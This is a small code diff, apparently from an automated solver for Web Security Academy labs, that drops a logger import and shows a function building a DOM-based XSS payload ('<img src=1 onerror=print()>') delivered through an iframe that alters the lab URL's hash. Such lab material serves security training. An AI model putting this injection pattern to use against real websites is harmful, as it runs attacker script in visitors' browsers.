@@ -1,6 +1,3 @@
-from web_security_academy.core.logger import logger
-
-
 def solve_lab(session):
     xss = "<img src=1 onerror=print()>"
     iframe = f"""<iframe src="{session.url}#" onload="this.src+='{xss}'">"""
